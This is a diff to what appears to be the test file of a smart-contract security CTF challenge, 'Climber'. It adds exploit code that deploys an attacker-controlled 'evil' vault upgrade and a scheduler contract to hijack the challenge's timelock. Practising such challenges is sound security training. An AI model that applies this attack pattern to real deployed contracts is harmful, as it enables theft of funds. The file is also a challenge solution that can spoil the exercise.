@@ -59,7 +59,17 @@ describe("[Challenge] Climber", function () {
     await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
   });
 
-  it("Exploit", async function () {});
+  it("Exploit", async function () {
+    this.evilUpgrade = await (
+      await ethers.getContractFactory("ClimberVaultUpgrade", attacker)
+    ).deploy();
+
+    this.scheduler = await (
+      await ethers.getContractFactory("Scheduler", attacker)
+    ).deploy(this.timelock.address, this.vault.address, this.evilUpgrade.address)
+
+    console.log(this.scheduler.address)
+  });
 
   after(async function () {
     /** SUCCESS CONDITIONS */
